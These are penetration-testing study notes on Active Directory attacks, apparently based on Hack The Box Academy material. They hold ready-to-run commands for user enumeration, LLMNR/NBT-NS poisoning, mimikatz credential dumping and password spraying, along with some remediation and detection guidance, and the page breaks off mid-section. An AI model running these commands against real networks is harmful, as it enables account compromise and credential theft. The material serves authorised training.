# Active Directory Attacks

- Prerequisites
    
    [Windows Basics](https://www.notion.so/Windows-Basics-92e2d4a4698848a88b84cc737a4ae237?pvs=21)
    
    [Windows Security Basics](https://www.notion.so/Windows-Security-Basics-a3be49509de34546b4bd04074f780f95?pvs=21)
    
    [*Windows Command line*](https://www.notion.so/Windows-Command-line-d66d5731cdd642c88249ba31adc99f18?pvs=21)
    
    [Active Directory Basics](https://www.notion.so/Active-Directory-Basics-b9ab0c3f116b490ea6f935f852a9e380?pvs=21)
    

---

# ______________________________________________________________________

# [=] Identifying Hosts

## [+] Capturing Traffic (Stealthy)

- A very stealthy way to identify hosts is to use wireshark or tcpdump to listen to any ARP requests and replies

```bash
sudo tcpdump -i ens224
```

```bash
sudo responder -I ens224 -A
```

## [+] ping sweep

```bash
fping -asgq $network_ip
```

# ______________________________________________________________________

# [=] Enumerating Domain

```powershell
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
```

```powershell
Forest                  : CONTROLLER.local
DomainControllers       : {Domain-Controller.CONTROLLER.local} 
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  :
PdcRoleOwner            : Domain-Controller.CONTROLLER.local   
RidRoleOwner            : Domain-Controller.CONTROLLER.local   
InfrastructureRoleOwner : Domain-Controller.CONTROLLER.local   
Name                    : CONTROLLER.local
```

# ______________________________________________________________________

# [=] Enumerating Users

## [+] **`Kerbrute` - Brute-forcing Kerberos pre-authentication**

 which is a much faster and potentially stealthier way to perform password spraying. This method does not generate Windows event ID [4625: An account failed to log on](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625), or a logon failure which is often monitored for. 

- info
    
    This tool uses [Kerberos Pre-Authentication](https://ldapwiki.com/wiki/Kerberos%20Pre-Authentication), which is a much faster and potentially stealthier way to perform password spraying. This method does not generate Windows event ID [4625: An account failed to log on](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625), or a logon failure which is often monitored for. The tool sends TGT requests to the domain controller without Kerberos Pre-Authentication to perform username enumeration. If the KDC responds with the error `PRINCIPAL UNKNOWN`, the username is invalid. Whenever the KDC prompts for Kerberos Pre-Authentication, this signals that the username exists, and the tool will mark it as valid. This method of username enumeration does not cause logon failures and will not lock out accounts. However, once we have a list of valid users and switch gears to use this tool for password spraying, failed Kerberos Pre-Authentication attempts will count towards an account's failed login accounts and can lead to account lockout, so we still must be careful regardless of the method chosen. We will use Kerbrute in conjunction with the `jsmith.txt` or `jsmith2.txt` user lists from [Insidetrust](https://github.com/insidetrust/statistically-likely-usernames). This repository contains many different user lists that can be extremely useful when attempting to enumerate users when starting from an unauthenticated perspective. We can point Kerbrute at the DC we found earlier and feed it a wordlist. The tool is quick, and we will be provided with results letting us know if the accounts found are valid or not, which is a great starting point for launching attacks such as password spraying, which we will cover in-depth later in this module.
    
    Using Kerbrute for username enumeration will generate event ID [4768: A Kerberos authentication ticket (TGT) was requested](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4768). This will only be triggered if [Kerberos event logging](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/enable-kerberos-event-logging) is enabled via Group Policy. Defenders can tune their SIEM tools to look for an influx of this event ID, which may indicate an attack. If we are successful with this method during a penetration test, this can be an excellent recommendation to add to our report.
    

```bash
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc $dc_ip $usernames_wordlist -o valid_ad_users
```

## [+] `net` command (domain joined)

```powershell
net user username
```

```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$searchString = "LDAP://"
$searchString += $PDC + "/"
$distinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$searchString += $distinguishedName
echo $searchString # LDAP://Domain-Controller.CONTROLLER.local/DC=CONTROLLER,DC=local
$searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$searchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry # Get the root of the active directory 
$searcher.SearchRoot = $objDomain
$searcher.filter = "samAccountType=805306368"
$result = $searcher.FindAll()

Foreach($obj in $result)
{
	Foreach($property in $obj.Properties)
	{
		echo $property
	}
	Write-Host "________________________"
}
```

## [+] `CrackMapExec` - with valid SMB credentials

```bash
sudo crackmapexec smb $ip -u $username -p $password --users
```

## [+]  SMB NULL Session

### [-] `enum4linux`

```bash
enum4linux $ip -U | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

### [-] `enumdomusers`

```bash
rcpclient -U "" -N $ip
rpcclient $> enumdomusers
```

```bash
echo "enumdomusers" | rpcclient -U "" -N $ip | cut -d '[' -f 2 | cut -d ']' -f 1 > valid_usernames.txt
```

### [-] `CrackMapExec`

```bash
crackmapexec smb $ip --users
```

- info
    
    we can use `CrackMapExec` with the `--users` flag. This is a useful tool that will also show the `badpwdcount` (invalid login attempts), so we can remove any accounts from our list that are close to the lockout threshold.It also shows the `baddpwdtime`, which is the date and time of the last bad password attempt, so we can see how close an account is to having its `badpwdcount` reset. In an environment with multiple Domain Controllers, this value is maintained separately on each one. To get an accurate total of the account's bad password attempts, we would have to either query each Domain Controller and use the sum of the values or query the Domain Controller with the PDC Emulator FSMO role.
    

## [+] LDAP Anonymous Bind (legacy)

### [-] `ldabsearch`

- info
    
    [LDAP anonymous binds](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/anonymous-ldap-operations-active-directory-disabled) allow unauthenticated attackers to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy. This is a legacy configuration, and as of Windows Server 2003, only authenticated users are permitted to initiate LDAP requests. We still see this configuration from time to time as an admin may have needed to set up a particular application to allow anonymous binds and given out more than the intended amount of access, thereby giving unauthenticated users access to all objects in AD.
    
- With an LDAP anonymous bind, we can use LDAP-specific enumeration tools such as `windapseach.py`, `ldapsearch`, `ad-ldapdomaindump.py`, etc., to pull the password policy. With [ldapsearch](https://linux.die.net/man/1/ldapsearch), it can be a bit cumbersome but doable.

```bash
ldapsearch -h $ip -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d " "
```

### [-] `windapsearch.py`

Tools such as `windapsearch` make this easier (though we should still understand how to create our own LDAP search filters). Here we can specify anonymous access by providing a blank username with the `-u`
 flag and the `-U` flag to tell the tool to retrieve just users.

```bash
windapsearch.py --dc-ip $ip -u "" -U
```

# ______________________________________________________________________

# [=] Enumerating Groups & members

```powershell
net group /domain 
```

- Enumerating all the groups

```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$searchString = "LDAP://"
$searchString += $PDC + "/"
$distinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$searchString += $distinguishedName
$searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$searchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry # Get the root of the active directory 
$searcher.SearchRoot = $objDomain
$searcher.filter = "objectClass=Group"
$groups = $searcher.FindAll()

Foreach($group in $groups)
{
    echo $group.Properties.name
}
```

- Enumerate group members

```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$searchString = "LDAP://"
$searchString += $PDC + "/"
$distinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$searchString += $distinguishedName
$searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$searchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry # Get the root of the active directory 
$searcher.SearchRoot = $objDomain
$searcher.filter = "(name=group_name)"
$groups = $searcher.FindAll()

Foreach($group in $groups)
{
    echo $group.Properties.member# if you found a nested group don't forget to enumerate it by replaceing the group_name in the filter
}
```

# ______________________________________________________________________

# [=] LLMNR & NBT-NS **Poisoning**

## info

[Link-Local Multicast Name Resolution](https://datatracker.ietf.org/doc/html/rfc4795) (LLMNR) and [NetBIOS Name Service](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc940063(v=technet.10)?redirectedfrom=MSDN) (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification that can be used when DNS fails. If a machine attempts to resolve a host but DNS resolution fails, typically, the machine will try to ask all other machines on the local network for the correct host address via LLMNR. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. It uses port `5355` over UDP natively. If LLMNR fails, the NBT-NS will be used. NBT-NS identifies systems on a local network by their NetBIOS name. NBT-NS utilizes port `137` over UDP.

The kicker here is that when LLMNR/NBT-NS are used for name resolution, ANY host on the network can reply. This is where we come in with `Responder`
 to poison these requests. With network access, we can spoof an authoritative name resolution source ( in this case, a host that's supposed to belong in the network segment ) in the broadcast domain by responding to LLMNR and NBT-NS traffic as if they have an answer for the requesting host. This poisoning effort is done to get the victims to communicate with our system by pretending that our rogue system knows the location of the requested host. If the requested host requires name resolution or authentication actions, we can capture the NetNTLM hash and subject it to an offline brute force attack in an attempt to retrieve the cleartext password. The captured authentication request can also be relayed to access another host or used against a different protocol (such as LDAP) on the same host. LLMNR/NBNS spoofing combined with a lack of SMB signing can often lead to administrative access on hosts within a domain.

## Example

1. A host attempts to connect to the print server at \\print01.inlanefreight.local, but accidentally types in \\printer01.inlanefreight.local.
2. The DNS server responds, stating that this host is unknown.
3. The host then broadcasts out to the entire local network asking if anyone knows the location of \\printer01.inlanefreight.local.
4. The attacker (us with `Responder` running) responds to the host stating that it is the \\printer01.inlanefreight.local that the host is looking for.
5. The host believes this reply and sends an authentication request to the attacker with a username and NTLMv2 password hash.
6. This hash can then be cracked offline or used in an SMB Relay attack if the right conditions exist.

## Responder

```bash
responder -I $interface
```

- crack the hash using hashcat or john
- you can use responder in linux and windows

## inveigh

- it’s like responder but written in powershell (the original) or C# (the current maintainer) (**InveighZero)**

```bash
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

### inveigh commands

- Press ESC to enter/exit interactive console
- `HELP`
- `GET NTLMV2UNIQUE`
- `GET NTLMV2USERNAMES`

## **Remediation**

Mitre ATT&CK lists this technique as [ID: T1557.001](https://attack.mitre.org/techniques/T1557/001), `Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay`.

There are a few ways to mitigate this attack. To ensure that these spoofing attacks are not possible, we can disable LLMNR and NBT-NS. As a word of caution, it is always worth slowly testing out a significant change like this to your environment carefully before rolling it out fully. As penetration testers, we can recommend these remediation steps, but should clearly communicate to our clients that they should test these changes heavily to ensure that disabling both protocols does not break anything in the network.

We can disable LLMNR in Group Policy by going to Computer Configuration --> Administrative Templates --> Network --> DNS Client and enabling "Turn OFF Multicast Name Resolution."

![https://academy.hackthebox.com/storage/modules/143/llmnr_disable.png](https://academy.hackthebox.com/storage/modules/143/llmnr_disable.png)

NBT-NS cannot be disabled via Group Policy but must be disabled locally on each host. We can do this by opening `Network and Sharing Center` under `Control Panel`, clicking on `Change adapter settings`, right-clicking on the adapter to view its properties, selecting `Internet Protocol Version 4 (TCP/IPv4)`, and clicking the `Properties` button, then clicking on `Advanced` and selecting the `WINS` tab and finally selecting `Disable NetBIOS over TCP/IP`.

![https://academy.hackthebox.com/storage/modules/143/disable_nbtns.png](https://academy.hackthebox.com/storage/modules/143/disable_nbtns.png)

While it is not possible to disable NBT-NS directly via GPO, we can create a PowerShell script under Computer Configuration --> Windows Settings --> Script (Startup/Shutdown) --> Startup with something like the following:

Code: powershell

```
$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
Get-ChildItem $regkey |foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}

```

In the Local Group Policy Editor, we will need to double click on `Startup`, choose the `PowerShell Scripts` tab, and select "For this GPO, run scripts in the following order" to `Run Windows PowerShell scripts first`, and then click on `Add` and choose the script. For these changes to occur, we would have to either reboot the target system or restart the network adapter.

![https://academy.hackthebox.com/storage/modules/143/nbtns_gpo.png](https://academy.hackthebox.com/storage/modules/143/nbtns_gpo.png)

To push this out to all hosts in a domain, we could create a GPO using `Group Policy Management` on the Domain Controller and host the script on the SYSVOL share in the scripts folder and then call it via its UNC path such as:

`\\inlanefreight.local\SYSVOL\INLANEFREIGHT.LOCAL\scripts`

Once the GPO is applied to specific OUs and those hosts are restarted, the script will run at the next reboot and disable NBT-NS, provided that the script still exists on the SYSVOL share and is accessible by the host over the network.

![https://academy.hackthebox.com/storage/modules/143/nbtns_gpo_dc.png](https://academy.hackthebox.com/storage/modules/143/nbtns_gpo_dc.png)

Other mitigations include filtering network traffic to block LLMNR/NetBIOS traffic and enabling SMB Signing to prevent NTLM relay attacks. Network intrusion detection and prevention systems can also be used to mitigate this activity, while network segmentation can be used to isolate hosts that require LLMNR or NetBIOS enabled to operate correctly.

---

## **Detection**

It is not always possible to disable LLMNR and NetBIOS, and therefore we need ways to detect this type of attack behavior. One way is to use the attack against the attackers by injecting LLMNR and NBT-NS requests for non-existent hosts across different subnets and alerting if any of the responses receive answers which would be indicative of an attacker spoofing name resolution responses. This [blog post](https://www.praetorian.com/blog/a-simple-and-effective-way-to-detect-broadcast-name-resolution-poisoning-bnrp/) explains this method more in-depth.

Furthermore, hosts can be monitored for traffic on ports UDP 5355 and 137, and event IDs [4697](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4697) and [7045](https://www.manageengine.com/products/active-directory-audit/kb/system-events/event-id-7045.html) can be monitored for. Finally, we can monitor the registry key `HKLM\Software\Policies\Microsoft\Windows NT\DNSClient` for changes to the `EnableMulticast` DWORD value. A value of `0` would mean that LLMNR is disabled.

# ______________________________________________________________________

# [=] Enumerating Logged in Users

- we can  use **`NetWkstaUserEnum` and `NetSessionEnum`**
    - `NetWkstaUserEnum` requires Administrative Permissions and returns a list of **all users**
    - `NetSessionEnum` does not require  Administrative Permissions and returns a list of current **logged in users**
- we will use PowerView to ease the process, import Powerview first
    - **`Get-NetLoggedon [-ComputerName name]`   invokes**  `NetWkstaUserEnum`
    - **`Get-NetSession [-ComputerName name]`      invokes** `NetSessionEnum`

# ______________________________________________________________________

# [=] Enumerating SPNs

- **`Get-UserSPNs` (enumerate services instead of performing port scanning)**

localsystem, localservice, networkservice

# ______________________________________________________________________

# [=] **Tools of the Trade**

---

Many of the module sections require tools such as open-source scripts or precompiled binaries. These can be found in the `C:\Tools` directory on the Windows hosts provided in the sections aimed at attacking from Windows. In sections that focus on attacking AD from Linux, we provide a Parrot Linux host customized for the target environment as if you were an anonymous user with an attack host within the internal network. All necessary tools and scripts are preloaded on this host (either installed or in the `/opt` directory). Here is a listing of many of the tools that we will cover in this module:

| Tool | Description |
| --- | --- |
| https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1/https://github.com/dmchell/SharpView | A PowerShell tool and a .NET port of the same used to gain situational awareness in AD. These tools can be used as replacements for various Windows net* commands and more. PowerView and SharpView can help us gather much of the data that BloodHound does, but it requires more work to make meaningful relationships among all of the data points. These tools are great for checking what additional access we may have with a new set of credentials, targeting specific users or computers, or finding some "quick wins" such as users that can be attacked via Kerberoasting or ASREPRoasting. |
| https://github.com/BloodHoundAD/BloodHound | Used to visually map out AD relationships and help plan attack paths that may otherwise go unnoticed. Uses the https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors PowerShell or C# ingestor to gather data to later be imported into the BloodHound JavaScript (Electron) application with a https://neo4j.com/ database for graphical analysis of the AD environment. |
| https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors | The C# data collector to gather information from Active Directory about varying AD objects such as users, groups, computers, ACLs, GPOs, user and computer attributes, user sessions, and more. The tool produces JSON files which can then be ingested into the BloodHound GUI tool for analysis. |
| https://github.com/fox-it/BloodHound.py | A Python-based BloodHound ingestor based on the https://github.com/CoreSecurity/impacket/. It supports most BloodHound collection methods and can be run from a non-domain joined attack host. The output can be ingested into the BloodHound GUI for analysis. |
| https://github.com/ropnop/kerbrute | A tool written in Go that uses Kerberos Pre-Authentication to enumerate Active Directory accounts, perform password spraying, and brute-forcing. |
| https://github.com/SecureAuthCorp/impacket | A collection of tools written in Python for interacting with network protocols. The suite of tools contains various scripts for enumerating and attacking Active Directory. |
| https://github.com/lgandx/Responder | Responder is a purpose-built tool to poison LLMNR, NBT-NS, and MDNS, with many different functions. |
| https://github.com/Kevin-Robertson/Inveigh/blob/master/Inveigh.ps1 | Similar to Responder, a PowerShell tool for performing various network spoofing and poisoning attacks. |
| https://github.com/Kevin-Robertson/Inveigh/tree/master/Inveigh | The C# version of Inveigh with a semi-interactive console for interacting with captured data such as username and password hashes. |
| https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/rpcinfo | The rpcinfo utility is used to query the status of an RPC program or enumerate the list of available RPC services on a remote host. The "-p" option is used to specify the target host. For example the command "rpcinfo -p 10.0.0.1" will return a list of all the RPC services available on the remote host, along with their program number, version number, and protocol. Note that this command must be run with sufficient privileges. |
| https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html | A part of the Samba suite on Linux distributions that can be used to perform a variety of Active Directory enumeration tasks via the remote RPC service. |
| https://github.com/byt3bl33d3r/CrackMapExec | CME is an enumeration, attack, and post-exploitation toolkit which can help us greatly in enumeration and performing attacks with the data we gather. CME attempts to "live off the land" and abuse built-in AD features and protocols like SMB, WMI, WinRM, and MSSQL. |
| https://github.com/GhostPack/Rubeus | Rubeus is a C# tool built for Kerberos Abuse. |
| https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py | Another Impacket module geared towards finding Service Principal names tied to normal users. |
| https://hashcat.net/hashcat/ | A great hash cracking and password recovery tool. |
| https://github.com/CiscoCXSecurity/enum4linux | A tool for enumerating information from Windows and Samba systems. |
| https://github.com/cddmp/enum4linux-ng | A rework of the original Enum4linux tool that works a bit differently. |
| https://linux.die.net/man/1/ldapsearch | Built-in interface for interacting with the LDAP protocol. |
| https://github.com/ropnop/windapsearch | A Python script used to enumerate AD users, groups, and computers using LDAP queries. Useful for automating custom LDAP queries. |
| https://github.com/dafthack/DomainPasswordSpray | DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain. |
| https://github.com/leoloobeek/LAPSToolkit | The toolkit includes functions written in PowerShell that leverage PowerView to audit and attack Active Directory environments that have deployed Microsoft's Local Administrator Password Solution (LAPS). |
| https://github.com/ShawnDEvans/smbmap | SMB share enumeration across a domain. |
| https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py | Part of the Impacket toolkit, it provides us with Psexec-like functionality in the form of a semi-interactive shell. |
| https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py | Part of the Impacket toolkit, it provides the capability of command execution over WMI. |
| https://github.com/SnaffCon/Snaffler | Useful for finding information (such as credentials) in Active Directory on computers with accessible file shares. |
| https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py | Simple SMB server execution for interaction with Windows hosts. Easy way to transfer files within a network. |
| https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11) | Adds, reads, modifies and deletes the Service Principal Names (SPN) directory property for an Active Directory service account. |
| https://github.com/ParrotSec/mimikatz | Performs many functions. Notably, pass-the-hash attacks, extracting plaintext passwords, and Kerberos ticket extraction from memory on a host. |
| https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py | Remotely dump SAM and LSA secrets from a host. |
| https://github.com/Hackplayers/evil-winrm | Provides us with an interactive shell on a host over the WinRM protocol. |
| https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py | Part of the Impacket toolkit, it provides the ability to interact with MSSQL databases. |
| https://github.com/Ridter/noPac | Exploit combo using CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user. |
| https://github.com/SecureAuthCorp/impacket/blob/master/examples/rpcdump.py | Part of the Impacket toolset, RPC endpoint mapper. |
| https://github.com/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py | Printnightmare PoC in python. |
| https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py | Part of the Impacket toolset, it performs SMB relay attacks. |
| https://github.com/topotam/PetitPotam | PoC tool for CVE-2021-36942 to coerce Windows hosts to authenticate to other machines via MS-EFSRPC EfsRpcOpenFileRaw or other functions. |
| https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py | Tool for manipulating certificates and TGTs. |
| https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py | This tool will use an existing TGT to request a PAC for the current user using U2U. |
| https://github.com/dirkjanm/adidnsdump | A tool for enumerating and dumping DNS records from a domain. Similar to performing a DNS Zone transfer. |
| https://github.com/t0thkr1s/gpp-decrypt | Extracts usernames and passwords from Group Policy preferences files. |
| https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py | Part of the Impacket toolkit. Used to perform the ASREPRoasting attack to list and obtain AS-REP hashes for users with the 'Do not require Kerberos preauthentication' set. These hashes are then fed into a tool such as Hashcat for attempts at offline password cracking. |
| https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py | SID bruteforcing tool. |
| https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py | A tool for creation and customization of TGT/TGS tickets. It can be used for Golden Ticket creation, child to parent trust attacks, etc. |
| https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py | Part of the Impacket toolkit, It is a tool for automated child to parent domain privilege escalation. |
| https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer | Active Directory Explorer (AD Explorer) is an AD viewer and editor. It can be used to navigate an AD database and view object properties and attributes. It can also be used to save a snapshot of an AD database for offline analysis. When an AD snapshot is loaded, it can be explored as a live version of the database. It can also be used to compare two AD database snapshots to see changes in objects, attributes, and security permissions. |
| https://www.pingcastle.com/documentation/ | Used for auditing the security level of an AD environment based on a risk assessment and maturity framework (based on https://en.wikipedia.org/wiki/Capability_Maturity_Model_Integration adapted to AD security). |
| https://github.com/Group3r/Group3r | Group3r is useful for auditing and finding security misconfigurations in AD Group Policy Objects (GPO). |
| https://github.com/adrecon/ADRecon | A tool used to extract various data from a target AD environment. The data can be output in Microsoft Excel format with summary views and analysis to assist with analysis and paint a picture of the environment's overall security state. |

# ______________________________________________________________________

# [=] Getting Credentials - Initial Access

## [+] OSINT

- Users who ask questions on public forums such as [Stack Overflow](https://stackoverflow.com/) but disclose sensitive information such as their credentials in the question.
- Developers that upload scripts to services such as [Github](https://github.com/) with credentials hardcoded.
- Credentials being disclosed in past breaches since employees used their work
accounts to sign up for other external websites. Websites such as [HaveIBeenPwned](https://haveibeenpwned.com/) and [DeHashed](https://www.dehashed.com/) provide excellent platforms to determine if someone's information, such as work email, was ever involved in a publicly known data breach.

By using OSINT techniques, it may be possible to recover publicly disclosed credentials. If we are lucky enough to find credentials, we will still need to find a way to test whether they are valid or not since OSINT information can be outdated. **we will talk about NTLM Authenticated Services, which may provide an excellent avenue to test credentials to see if they are still valid.**

A detailed room on Red Team OSINT can be found [here.](https://tryhackme.com/jr/redteamrecon)

## [+] Phishing

A detailed room on phishing can be found [here.](https://tryhackme.com/module/phishing)

# ______________________________________________________________________

# [=] Dump Cached Credentials (Access Required)

```powershell
cmd> mimikatz.exe
mimikatz> privilege::debug
mimikatz> sekurlsa::logonpasswords
```

## [+] Harvesting Tickets

### [-] Harvesting Tickets ⇒ `mimikatz`

- **`mimikatz> sekurlsa::tickets`**

# ______________________________________________________________________

# [=] Enumerating the Password Policy

- Remember that sometimes we will not be able to obtain the password policy if we are performing external password spraying (or if we are on an internal assessment and cannot retrieve the policy using any of the methods shown here). In these cases, we `MUST` exercise extreme caution not to lock out accounts.

`Locked Account Duration: 30 minutes`

`Account Lockout Threshold: 5`

`Lockout observation window (minutes)`  every n minutes after the last login attempt AD will give additional free login attempt, When a user account is locked out due to multiple failed login attempts, the Lockout Observation Window specifies the duration of time that the system will monitor the account for any further failed attempts. If there are no further failed attempts during this time, the account will be automatically unlocked, and the user can attempt to log in again.

## [+] from Linux

### [-] `crackmapexe` - credentialed SMB

```bash
crackmapexec smb $ip -u $username -p $password --pass-pol
```

### [-] `rpcclient` - SMB NULL Sessions

```bash
rpcclient -U "" -N $ip
rpcclient $> querydominfo
rpcclient $> getdompwinfo
```

### [-] `enum4linux` - SMB NULL Sessions

```bash
enum4linux $ip -P
```

`-P` get password policy information

### [-] `ldabsearch` - LDAP Anonymous Bind (legacy)

- info
    
    [LDAP anonymous binds](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/anonymous-ldap-operations-active-directory-disabled) allow unauthenticated attackers to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy. This is a legacy configuration, and as of Windows Server 2003, only authenticated users are permitted to initiate LDAP requests. We still see this configuration from time to time as an admin may have needed to set up a particular application to allow anonymous binds and given out more than the intended amount of access, thereby giving unauthenticated users access to all objects in AD.
    
- With an LDAP anonymous bind, we can use LDAP-specific enumeration tools such as `windapseach.py`, `ldapsearch`, `ad-ldapdomaindump.py`, etc., to pull the password policy. With [ldapsearch](https://linux.die.net/man/1/ldapsearch), it can be a bit cumbersome but doable.

```bash
ldapsearch -h $ip -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

## [+] from Windows

### [-] SMB NULL Sessions

```bash
net use \\$HostName\ipc$ "" /u:""
```

### [-] `net` command

```bash
net accounts
```

### [-] `PowerView`

```powershell
Import-Module .\PowerView.ps1
Get-DomainPolicy
```

# ______________________________________________________________________

# [=] Password Spray

- it’s preferable to enumerate the Password Policy starting password spraying attack to add a proper waiting time to avoid accounts lockout
- To mount a successful password spraying attack, we first need a list of valid domain users to attempt to authenticate with. There are several ways that we can gather a target list of valid users:
    - By leveraging an SMB NULL session to retrieve a complete list of domain users from the domain controller
    - Utilizing an LDAP anonymous bind to query LDAP anonymously and pull down the domain user list
    - Using a tool such as `Kerbrute` to validate users utilizing a word list from a source such as the [stastically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames) GitHub repo, or gathered by using a tool such as [linkedin2username](https://github.com/initstring/linkedin2username) to create a list of potentially valid users
    - Using a set of credentials from a Linux or Windows attack system either provided by our client or obtained through another means such as LLMNR/NBT-NS response poisoning using `Responder` or even a successful password spray using a smaller wordlist
- **failed Kerberos Pre-Authentication attempts will count towards an account's failed login accounts and can lead to account lockout, so we still must be careful regardless of the method chosen.**
- In the Domain Controller’s security log, many instances of event ID [4625: An account failed to log on](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625) over a short period may indicate a password spraying attack. Organizations should have rules to correlate many logon failures within a set time interval to trigger an alert. A more savvy attacker may avoid SMB password spraying and instead target LDAP. Organizations should also monitor event ID [4771: Kerberos pre-authentication failed](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4771), which may indicate an LDAP password spraying attempt. To do so, they will need to enable Kerberos logging. This [post](https://www.hub.trimarcsecurity.com/post/trimarc-research-detecting-password-spraying-with-security-event-auditing) details research around detecting password spraying using Windows Security Event Logging.With these mitigations finely tuned and with logging enabled, an organization will be well-positioned to detect and defend against internal and external password spraying attacks.
- https://github.com/insidetrust/statistically-likely-usernames

[https://github.com/initstring/linkedin2username](https://github.com/initstring/linkedin2username)

[Top tools for password-spraying attacks in active directory networks - Infosec Resources](https://resources.infosecinstitute.com/topic/top-tools-for-password-spraying-attacks-in-active-directory-networks/)

## [+] From Linux

### [-] `rpcclient`

```bash
for username in $(cat valid_users.txt);do rpcclient -U "$username%Welcome1" -c "getusername;quit" $dc_ip | grep Authority; done
```

## [+] From Windows

### [-] `DomainPasswordSpray.ps1`

- https://github.com/dafthack/DomainPasswordSpray

```bash
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

Since the host is domain-joined, we will skip the `-UserList` flag and let the tool generate a list for us.

### [-] `Rubeus` - Password-Spray

- Rubeus can both brute force passwords as well as password spray user accounts. When brute-forcing passwords you use a single user account and a wordlist of passwords to see which password works for that given user account. In password spraying, you give a single password such as Password1 and "spray" against all found user accounts in the domain to find which one may have that password.
- hint: tickets save as `.kirbi` for Rubeus, `.ccache` for Impacket

```powershell
Rubeus.exe brute /password:Password1 /noticket
```

## [+] cross-platform (Windows/Linux)

### [-] `Kerbrute`

```bash
kerbrute passwordspray -d inlanefreight.local --dc $dc_ip valid_users.txt  Welcome1
```

### [-] `CrackMapExec`

```bash
crackmapexec smb $ip -u valid_users.txt -p Password123 | grep +
```

- we can validate the result using `crackmapexec`
    
    ```bash
    crackmapexec smb $ip -u $valid_username -p $valid_password
    ```
    

### [-] `CrackMapExec` - Local Admin Spraying

- info
    
    Sometimes we may only retrieve the NTLM hash for the local administrator account from the local SAM database. In these instances, we can spray the NT hash across an entire subnet (or multiple subnets) to hunt for local administrator accounts with the same password set. In the example below, we attempt to authenticate to all hosts in a /23 network using the built-in local administrator account NT hash retrieved from another machine. The `--local-auth`
     flag will tell the tool only to attempt to log in one time on each machine which removes any risk of account lockout. `Make sure this flag is set so we don't potentially lock out the built-in administrator for the domain`
    . By default, without the local auth option set, the tool will attempt to authenticate using the current domain, which could quickly result in account lockouts.
    
    This technique, while effective, is quite noisy and is not a good choice for any assessments that require stealth. It is always worth looking for this issue during penetration tests, even if it is not part of our path to compromise the domain, as it is a common issue and should be highlighted for our clients. One way to remediate this issue is using the free Microsoft tool [Local Administrator Password Solution (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899)
     to have Active Directory manage local administrator passwords and enforce a unique password on each host that rotates on a set interval.
    

```bash
